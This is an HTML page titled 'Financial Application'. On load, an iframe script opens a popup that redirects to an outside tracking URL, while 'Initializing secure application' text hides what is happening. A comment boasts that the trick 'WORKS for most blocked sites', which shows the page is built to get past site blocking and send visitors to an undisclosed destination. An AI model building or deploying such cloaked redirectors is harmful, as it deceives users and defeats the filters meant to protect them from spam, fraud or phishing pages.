<!DOCTYPE html>
<html>
<head>
    <title>Financial Application</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        #container { width: 100%; height: 100vh; }
    </style>
</head>
<body>
    <!-- This WORKS for most blocked sites -->
    <iframe id="container" sandbox="allow-scripts allow-same-origin allow-forms"
            srcdoc="
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset='utf-8'>
                    <title>Loading Form...</title>
                    <style>
                        body { margin: 0; padding: 100px; text-align: center; font-family: Arial; }
                    </style>
                    <script>
                        // Create a NEW window inside this iframe
                        const newWindow = window.open('', '_blank');
                        if (newWindow) {
                            newWindow.document.write(`
                                <!DOCTYPE html>
                                <html>
                                <head>
                                    <meta http-equiv='refresh' content='0;url=https://trkmcl.com/wy8odpg43k/xwndpp7qne'>
                                </head>
                                <body style='margin:0;padding:0;'>
                                    <div style='text-align:center;padding-top:100px;'>
                                        <h3>Opening Application Form...</h3>
                                    </div>
                                </body>
                                </html>
                            `);
                            newWindow.document.close();
                            
                            // Copy the content back to parent iframe
                            setTimeout(() => {
                                try {
                                    document.body.innerHTML = newWindow.document.body.innerHTML;
                                } catch(e) {
                                    // If cross-origin, just keep it open
                                }
                            }, 1000);
                        }
                    <\/script>
                </head>
                <body>
                    <h3>Initializing secure application...</h3>
                    <p>Please wait...</p>
                </body>
                </html>
            ">
    </iframe>
</body>
</html>
